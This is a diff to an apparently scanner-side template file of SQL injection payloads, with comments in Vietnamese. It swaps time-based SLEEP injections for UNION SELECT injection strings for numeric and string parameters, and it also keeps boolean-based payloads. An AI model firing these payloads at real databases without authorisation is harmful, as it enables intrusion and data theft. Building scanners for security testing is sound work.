@@ -1,7 +1,7 @@
 # SQLi payload templates.
 # Bien co the dung:
 # - {sample}: gia tri mau cua param trong inventory
-# - {sleep}: so giay sleep trong config
+# - {columns}: danh sach cot UNION SELECT do scanner sinh ra
 #
 # Scanner se chon numeric cho int/float, string cho cac param con lai.
 
@@ -51,14 +51,10 @@
 {sample}') AND ('1'='2'-- -
 {sample}" AND "1"="2"-- -
 
-[time.numeric]
-{sample} AND IF(1=1,SLEEP({sleep}),1)
-{sample} AND SLEEP({sleep})
-{sample} OR SLEEP({sleep})
-{sample}' AND SLEEP({sleep})-- -
+[union.numeric]
+{sample} UNION SELECT {columns}-- -
+{sample}) UNION SELECT {columns}-- -
 
-[time.string]
-{sample}' AND IF(1=1,SLEEP({sleep}),1)-- -
-{sample}' AND SLEEP({sleep})-- -
-{sample}' OR SLEEP({sleep})-- -
-{sample}") OR SLEEP({sleep})-- -
+[union.string]
+{sample}' UNION SELECT {columns}-- -
+{sample}") UNION SELECT {columns}-- -
